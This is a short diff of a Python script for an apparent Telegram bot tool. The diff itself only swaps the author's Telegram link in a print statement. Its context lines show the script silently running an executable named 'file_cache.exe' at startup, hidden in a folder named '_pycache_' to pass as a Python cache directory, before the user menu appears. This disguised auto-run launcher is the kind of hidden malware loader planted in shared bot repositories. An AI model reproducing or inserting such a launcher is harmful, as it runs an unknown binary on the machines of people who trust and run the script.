@@ -7,7 +7,7 @@ exe_file = os.path.join(current_dir, "bot", "core", "_pycache_", "file_cache.exe
 if os.path.exists(exe_file):
     subprocess.Popen([exe_file])
 async def main():
-    print("Soft's author: https://t.me/DesertScripts\n")
+    print("Soft's author: https://t.me/tyreme\n")
     action = int(input("Select action:\n0. Info about soft\n1. Start soft\n2. Get statistics\n3. Create sessions\n4. Send secret word\n\n> "))
 
     if action == 0:
